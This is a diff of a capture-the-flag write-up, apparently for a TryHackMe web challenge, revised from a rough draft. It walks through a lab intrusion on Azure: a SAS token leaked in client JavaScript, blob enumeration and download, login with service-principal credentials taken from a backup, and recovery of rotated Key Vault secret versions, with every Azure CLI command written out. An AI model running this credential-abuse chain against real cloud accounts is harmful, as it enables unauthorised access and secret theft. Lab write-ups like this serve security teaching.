@@ -1,4 +1,4 @@
-<img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/0935f0f1-9a24-43ba-8099-a6c8b2cd8986" /><img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/a5feb3a4-a4f1-444c-88cb-df378dd5f204" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/ebbf52f5-5eb0-4006-83a6-41a0e290e09d" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/e165be01-8982-48c0-b1ee-86ab95ac6fb9" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/436d8986-7bed-4615-a3e7-1e54c177e12e" /><img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/4ddc1ef8-e1b7-4ffe-8aca-19ab4bc9cf08" /><img width="784" height="505" alt="image" src="https://github.com/user-attachments/assets/fedaf903-06ee-47ee-a5b0-1676a3c87158" /># Title: CryptoCabana
+Title: CryptoCabana
 
 #### Category: Web
 
@@ -73,75 +73,52 @@ The application stores users' wallet backups inside Azure Blob Storage using a S
 Although the application only intends to let users upload and access their own backups, exposing the SAS token allows anyone to enumerate accessible storage containers. This eventually leads to a backup service account, which provides access to Azure Key Vault where the flag is stored.
 
 
-
 ---
 
 ### Methodology
 
-Access the website 
+#### Part 1 – Inspect the Website
+Open the application
 
 ```https://cryptocabanaf5scjagc.z13.web.core.windows.net/```
 
 <img width="1420" height="773" alt="image" src="https://github.com/user-attachments/assets/0ffad43a-25d3-4f99-9243-579f863d1b1b" />
 
-Inspect website, put some random chars in the text field, Check network, Inspect Option Method Headers 
+Open Developer Tools.
+
+Enter random text and click Backup.
+
+Inspect the generated request under Network.
 
 <img width="1716" height="538" alt="image" src="https://github.com/user-attachments/assets/fff3aeb9-e180-47d3-9588-8d662397156d" />
 
-Analyze this: 
+Notice the request URL:
 ```
 https://cryptocabanaf5scjagc.blob.core.windows.net/backups/backup-1785929856192.txt??sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
 ```
+This query string is an Azure Shared Access Signature (SAS).
 
-It is not working because of the sp=rl the sp is only set to read list 
+A SAS token grants temporary access to Azure Storage without requiring an Azure account.
 
-Let's now go to app.js, to know how this website behave and we might find more clues 
+The important permission here is:
+
+> sp=rl
+
+where:
+- r = Read
+- l = List
+
+Although this token cannot upload or modify files, it can enumerate containers and download existing blobs.
+
+
+
+#### Part 2 – Inspect app.js
+
+Open app.js.
 
 <img width="1174" height="575" alt="image" src="https://github.com/user-attachments/assets/7cb75957-4723-4af7-9bc0-1cbd79cb2223" />
 
-```
-const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
-const BACKUPS_CONTAINER = "backups";
-const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
-
-function backupPhrase() {
-  const phrase = document.getElementById("phrase").value.trim();
-  const status = document.getElementById("status");
-  if (!phrase) {
-    status.textContent = "Enter a phrase first.";
-    return;
-  }
-
-  const blobName = "backup-" + Date.now() + ".txt";
-  const url =
-    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
-    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;
-
-  fetch(url, {
-    method: "PUT",
-    headers: { "x-ms-blob-type": "BlockBlob" },
-    body: phrase,
-  })
-    .then((res) => {
-      status.textContent = res.ok
-        ? "Backed up. Sleep easy."
-        : "Backup failed (" + res.status + ").";
-    })
-    .catch(() => {
-      status.textContent = "Backup failed â€” network error.";
-    });
-}
-```
-
-Analysis:
-> 
-
-
-
-
-
-
-Let's retrieve important parts of this .js file 
+The application exposes several important values:
 
 ```
 const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
@@ -150,20 +127,40 @@ const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st
 
 ```
 
-Paste the Storage_Account and Backup_sas to the azure CLI 
-##Prepare the SAS for Azure CLI
+#### Analysis:
+
+This tells us:
+
+- the Azure Storage Account name
+- the reusable SAS token
+
+These are all we need to interact with the storage account directly using Azure CLI.
+
+
+
+
+
+#### Part 3 – Prepare Azure CLI
+
+Store the values in shell variables.
 
 ```
 ACCOUNT='cryptocabanaf5scjagc'
+
 SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
 ```
 
 <img width="1549" height="244" alt="image" src="https://github.com/user-attachments/assets/7a643fe0-42b5-4cd8-bf33-191db5d4eecf" />
 
-(Explain the structure of the commands we are putting to the Azure Cli) 
+Why use variables?
 
-Paste a command to Azure CLI to List every container in the storage 
-##List every container in the storage account
+> Instead of typing the long storage account name and SAS token repeatedly, we save them as variables so every Azure CLI command becomes shorter and easier to read.
+
+
+#### Part 4 – Enumerate Storage Containers
+
+List every container:
+
 ```
 az storage container list \
   --account-name "$ACCOUNT" \
@@ -174,11 +171,13 @@ az storage container list \
 
 <img width="1533" height="478" alt="image" src="https://github.com/user-attachments/assets/f416ed60-1586-4126-8eb5-6fcbe3d939e9" />
 
-That could be the cryptocabana kiosk's vault and that's what we are aiming for 
+A container named vault immediately stands out.
 
+Since the challenge revolves around cryptocurrency backups, this is likely where the sensitive data is stored.
 
-Paste a command to enumerated the contents of vault 
-##enumerated the contents of vault:
+#### Part 5 – Enumerate the Vault
+
+List every blob inside the vault.
 
 ```
 az storage blob list \
@@ -191,11 +190,15 @@ az storage blob list \
 
 <img width="1530" height="475" alt="image" src="https://github.com/user-attachments/assets/4813a53b-f865-46d4-87be-581a96727f5e" />
 
-Here we can see the seed_phrase.txt let's download it because? what's the use of it? explain further
+We discover several interesting files, including:
 
+> seed_phrase.txt
+> 
+> backup-service-account.json
 
-Paste a command to download the seed phrase 
-##Download the seed phrase:
+#### Part 6 – Download the Seed Phrase
+
+Download:
 
 ```
 az storage blob download \
@@ -210,11 +213,7 @@ az storage blob download \
 
 <img width="801" height="178" alt="image" src="https://github.com/user-attachments/assets/105272a1-d49b-4e9b-b16f-31f9f5673d9a" />
 
-We now successfully downloaded the seed phrase 
-
-
-Paste a command to read the seed_phrase.txt
-##Read it:
+Read it:
 
 ```
 cat seed_phrase.txt
@@ -222,14 +221,14 @@ cat seed_phrase.txt
 
 <img width="992" height="45" alt="image" src="https://github.com/user-attachments/assets/ad9cdd6b-d98e-4c44-b915-8f3351b4c834" />
 
-(What does this mean? explain briefly - this is a clue to something I think?  )
 
 ``` velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp```
 
 
 
-Paste a command tO download the servie-account file 
-##Download the backup-service-account file:
+#### Part 7 – Download the Service Account
+
+Download:
 
 ```
 az storage blob download \
@@ -243,11 +242,7 @@ az storage blob download \
 
 <img width="754" height="181" alt="image" src="https://github.com/user-attachments/assets/2e819dfa-db2d-4272-bd02-c94dd365f00d" />
 
-We successfully downloaded it 
-
-
-Paste a command to print the JSON 
-##Pretty-print the JSON:
+Print it:
 
 ```
 jq . backup-service-account.json
@@ -255,9 +250,24 @@ jq . backup-service-account.json
 
 <img width="921" height="195" alt="image" src="https://github.com/user-attachments/assets/862eb573-f230-4193-8719-029363153a24" />
 
-We will have a new account (explain this further) 
+#### Analysis: 
 
-Create a variable for each of its content so we can easily call them 
+The JSON file contains credentials for an Azure Service Principal.
+
+Unlike a normal user account, a Service Principal is intended for applications and automation.
+
+The credentials include:
+
+- Client ID
+- Client Secret
+- Tenant ID
+- Key Vault name
+
+This gives us a second set of credentials with greater privileges than the exposed SAS token.
+
+#### Part 8 – Authenticate as the Service Principal
+
+Extract the credentials:
 ```
 CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
 CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
@@ -265,10 +275,7 @@ TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
 VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
 ```
 
-
-
-Paste a command to authenticated as the service principal 
-##authenticated as the service principal:
+Authenticate:
 
 ```
 az login \
@@ -284,8 +291,7 @@ az login \
 <img width="1288" height="425" alt="image" src="https://github.com/user-attachments/assets/5efe5db0-1e9d-4b55-a13b-9c05f19490db" />
 
 
-Verify the current Identity 
-##verify the current identity:
+Verify the identity:
 
 ```
 az account show --query user --output json
@@ -294,13 +300,11 @@ az account show --query user --output json
 
 <img width="581" height="121" alt="image" src="https://github.com/user-attachments/assets/bdb6bf31-9d26-49ec-824d-3015d7f2193f" />
 
-We ae now servicePrincipal 
+We are now authenticated as a Service Principal.
 
+#### Part 9 – Enumerate Azure Key Vault
 
-
-Paste a command to list secrets in  Azure Key vault 
-##List secrets in Azure Key Vault
-##We listed secret names and metadata:
+List all secrets:
 
 ```
 az keyvault secret list \
@@ -311,14 +315,18 @@ az keyvault secret list \
 ```
 <img width="771" height="219" alt="image" src="https://github.com/user-attachments/assets/b985597c-7b3b-4afa-866f-3e9bf22deaf3" />
 
-We can now have the Key shards 1 -3
+Three secrets are available:
+
+> key-shard-1
+> 
+> key-shard-2
+> 
+> key-shard-3
+
+Retrieve each one:
 
 
-Paste command to Retrieve individual secret values 
-##retrieved the current value of each shard:
-
-
-key-shard-1
+key-shard-1: 
 ```
 az keyvault secret show \
   --vault-name "$VAULT_NAME" \
@@ -329,9 +337,8 @@ az keyvault secret show \
 
 <img width="750" height="306" alt="image" src="https://github.com/user-attachments/assets/85d8bb90-6b2b-4fd1-8a63-722517ea08dc" />
 
-We got a part of the flag
 
-key-shard-2
+key-shard-2: 
 ```
 az keyvault secret show \
   --vault-name "$VAULT_NAME" \
@@ -342,9 +349,8 @@ az keyvault secret show \
 
 <img width="920" height="145" alt="image" src="https://github.com/user-attachments/assets/37934a5a-5f20-4c27-81b8-2fef0e1478ab" />
 
-The message says old value, we need to have a older version to get the shard 2
 
-key-shard-3
+key-shard-3: 
 ```
 az keyvault secret show \
   --vault-name "$VAULT_NAME" \
@@ -354,14 +360,16 @@ az keyvault secret show \
 ```
 <img width="418" height="139" alt="image" src="https://github.com/user-attachments/assets/1758047f-92e1-4812-9595-ff9c9f0cf603" />
 
-We got a part of the flag
+Shards 1 and 3 immediately reveal portions of the flag.
+However, Shard 2 only returns:
+> Old value.
 
 
-##Recover the older version of shard 2
-##Azure Key Vault secrets are versioned. When someone updates a secret, Azure normally creates a new version. The previous version is not automatically destroyed.
+#### Part 10 – Recover the Previous Version
 
-##list all versions of shard 2:
+Azure Key Vault keeps previous versions whenever a secret is updated.
 
+List all versions:
 ```
 az keyvault secret list-versions \
   --vault-name "$VAULT_NAME" \
@@ -371,11 +379,10 @@ az keyvault secret list-versions \
 ```
 <img width="1463" height="202" alt="image" src="https://github.com/user-attachments/assets/cb978409-2df1-4e33-b31d-ab0e58b90710" />
 
-as we notice the first one that have *5+00:00* is the first created so that's the older version we need to use
+Notice the earliest version.
 
+Retrieve it:
 
-Chose earlier version 
-##Choose the earlier version, take the final VERSION_ID component, and request that specific version:
 ```
 az keyvault secret show \
   --vault-name "$VAULT_NAME" \
@@ -387,10 +394,9 @@ az keyvault secret show \
 
 <img width="463" height="160" alt="image" src="https://github.com/user-attachments/assets/867e8868-cc21-4dcb-8001-871c6edda2d1" />
 
-We now got the value 
+This reveals the missing portion of the flag.
 
-
-
+Combine all three shards to recover the complete flag.
 
 
 ---
@@ -398,14 +404,17 @@ We now got the value
 ### Today's Itinerary
 
 1. Pull apart what the kiosk hands out for free before you've even clicked anything.
+> Inspect the application and identify the exposed Azure Storage credentials (SAS token).
 
 2. Follow that trust somewhere the kiosk's own page never once points you.
+> Use the leaked SAS token to enumerate Azure Blob Storage and discover sensitive backup files.
 
 3. Somewhere in there is a second, more valuable set of keys - and a vault that won't give up the real values on the first ask.
-
+> Recover the exposed Service Principal credentials, authenticate to Azure, access Azure Key Vault, retrieve the previous version of the rotated secret, and reconstruct the complete flag.
 
 ---
 
 ### Flag
 > THM{n0t_ur_k3ys_n0t_ur_c01ns!}
 
+This challenge demonstrates how exposing cloud credentials on the client side can lead to a complete compromise of cloud resources. The leaked Azure SAS token allowed enumeration of storage containers and access to sensitive backup files. Among those files was a Service Principal configuration containing privileged credentials, which granted access to Azure Key Vault. Even though one of the secrets had been rotated, Azure's built-in version history allowed recovery of the previous value, enabling reconstruction of the full flag. The challenge highlights the importance of protecting cloud credentials, limiting SAS permissions, and carefully managing sensitive data stored in cloud services.
